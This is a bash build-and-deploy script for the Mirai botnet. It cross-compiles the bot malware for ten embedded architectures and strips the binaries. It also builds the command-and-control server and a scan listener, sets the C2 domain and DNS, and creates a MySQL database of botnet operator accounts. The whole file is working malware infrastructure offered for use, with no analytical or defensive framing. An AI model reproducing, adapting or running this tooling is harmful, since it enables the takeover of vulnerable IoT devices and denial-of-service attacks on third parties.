#!/bin/bash

FLAGS=""

function compile_bot {
	echo "Compiling bot for arch $1"
	"$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
	"$1-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}

if [ $# == 2 ]; then
	if [ "$2" == "telnet" ]; then
		FLAGS="-DMIRAI_TELNET"
	elif [ "$2" == "ssh" ]; then
		FLAGS="-DMIRAI_SSH"
	fi
	if [ "$1" == "release" ]; then
		rm release/mirai.*
		rm release/miraint.*

		echo "Compiling cnc!"
		go build -o release/cnc cnc/*.go

		echo "Compiling bots!"
		compile_bot i586 mirai.x86 "$FLAGS -DKILLER_REBIND_SSH -static"
		compile_bot mips mirai.mips "$FLAGS -DKILLER_REBIND_SSH -static"
		compile_bot mipsel mirai.mpsl "$FLAGS -DKILLER_REBIND_SSH -static"
		compile_bot armv4l mirai.arm "$FLAGS -DKILLER_REBIND_SSH -static"
		compile_bot armv5l mirai.arm5n "$FLAGS -DKILLER_REBIND_SSH"
		compile_bot armv6l mirai.arm7 "$FLAGS -DKILLER_REBIND_SSH -static"
		compile_bot powerpc mirai.ppc "$FLAGS -DKILLER_REBIND_SSH -static"
		compile_bot sparc mirai.spc "$FLAGS -DKILLER_REBIND_SSH -static"
		compile_bot m68k mirai.m68k "$FLAGS -DKILLER_REBIND_SSH -static"
		compile_bot sh4 mirai.sh4 "$FLAGS -DKILLER_REBIND_SSH -static"

		compile_bot i586 miraint.x86 "-static"
		compile_bot mips miraint.mips "-static"
		compile_bot mipsel miraint.mpsl "-static"
		compile_bot armv4l miraint.arm "-static"
		compile_bot armv5l miraint.arm5n " "
		compile_bot armv6l miraint.arm7 "-static"
		compile_bot powerpc miraint.ppc "-static"
		compile_bot sparc miraint.spc "-static"
		compile_bot m68k miraint.m68k "-static"
		compile_bot sh4 miraint.sh4 "-static"

		echo "Compiling scanListen"
		go build -o release/scanListen tools/scanListen.go

		exit
	elif [ "$1" == "debug" ]; then
		gcc -std=c99 bot/*.c -DDEBUG "$FLAGS" -static -g -o debug/mirai.dbg
		mips-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.mips
		armv4l-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.arm
		armv6l-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.arm7
		sh4-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.sh4
		gcc -std=c99 tools/enc.c -g -o debug/enc
		gcc -std=c99 tools/nogdb.c -g -o debug/nogdb
		gcc -std=c99 tools/badbot.c -g -o debug/badbot
		go build -o debug/cnc cnc/*.go
		go build -o debug/scanListen tools/scanListen.go

		exit
	else
		echo "Unknown parameter $1: $0 <debug | release>"
		exit
	fi

elif [ $# == 1 ]; then
	if [ "$1" == "dependencies" ]; then
		echo "Installing dependencies!"
		sudo apt install gcc golang electric-fence mysql-server mysql-client screen python3 -y
		echo "Installing cross compilers!"
		sudo bash ./tools/compilers.sh
		echo "Atting path variables in ~/.bashrc"
		echo " " >> ~/.bashrc
		echo "export PATH=\$PATH:/etc/xcompile/armv4l/bin" >> ~/.bashrc
		echo "export PATH=\$PATH:/etc/xcompile/armv6l/bin" >> ~/.bashrc
		echo "export PATH=\$PATH:/etc/xcompile/i586/bin" >> ~/.bashrc
		echo "export PATH=\$PATH:/etc/xcompile/m68k/bin" >> ~/.bashrc
		echo "export PATH=\$PATH:/etc/xcompile/mips/bin" >> ~/.bashrc
		echo "export PATH=\$PATH:/etc/xcompile/mipsel/bin" >> ~/.bashrc
		echo "export PATH=\$PATH:/etc/xcompile/powerpc/bin" >> ~/.bashrc
		echo "export PATH=\$PATH:/etc/xcompile/powerpc-440fp/bin" >> ~/.bashrc
		echo "export PATH=\$PATH:/etc/xcompile/sh4/bin" >> ~/.bashrc
		echo "export PATH=\$PATH:/etc/xcompile/sparc/bin" >> ~/.bashrc
		echo "export PATH=\$PATH:/etc/xcompile/armv6l/bin" >> ~/.bashrc
		echo "export PATH=\$PATH:/usr/local/go/bin" >> ~/.bashrc
		echo "export GOPATH=\$HOME/Documents/go" >> ~/.bashrc
		
		echo "Setting go path for dependecie install"
		export PATH=$PATH:/usr/local/go/bin
		export GOPATH=$HOME/Documents/go

		echo "Installing go dependencies"
		go get github.com/go-sql-driver/mysql
		go get github.com/mattn/go-shellwords
		exit
	elif [ "$1" == "setup-domain" ]; then

		read -p "Domain: " MIRAI_DOMAIN
		python3 ./tools/replace.py $MIRAI_DOMAIN

		read -p "DNS (seperate with , instead of .): " MIRAI_DNS

		sed -i "s/8,8,8,8/$MIRAI_DNS/" bot/resolv.c

		exit
	elif [ "$1" == "run-dev" ]; then
		cd debug
		screen -S mirai-cnc sudo ./cnc
		screen -S mirai-bot sudo ./mirai.dbg
	elif [ "$1" == "mysql-setup" ]; then
		echo "Setting up MySQL database!"
		cat ./tools/db.sql | sudo mysql

		read -p "Mirai user: " MIRAI_USER
		read -p "Mirai password: " MIRAI_PASSWORD

		echo "Adding mirai user!"
		echo "USE mirai; INSERT INTO users VALUES (NULL, '$MIRAI_USER', '$MIRAI_PASSWORD', 0, 0, 0, 0, -1, 1, 30, '');" | sudo mysql

		read -p "MySQL password: " MYSQL_PASSWD

		echo "Setting up MySQL password!"
		echo "ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY '$MYSQL_PASSWD';" | sudo mysql
		sed -i "s/password/$MYSQL_PASSWD/" cnc/main.go

		sudo systemctl restart mysql
		exit
	fi
fi
